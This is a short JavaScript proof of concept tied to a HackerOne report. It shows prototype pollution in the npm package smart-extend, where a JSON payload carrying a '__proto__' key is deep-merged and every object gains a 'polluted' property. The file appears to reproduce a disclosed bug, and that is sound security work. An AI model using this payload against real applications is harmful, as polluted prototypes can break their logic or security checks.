//https://hackerone.com/reports/438274

var extend = require('smart-extend');
const assert = require('assert');

var payload = '{"__proto__":{"polluted":"yes"}}';
var test = {};
console.log("Before: ", test.polluted);

extend.deep({},JSON.parse(payload));

console.log("After: ", {}.polluted);
assert({}.polluted === "yes");
console.log("Payload success! ");


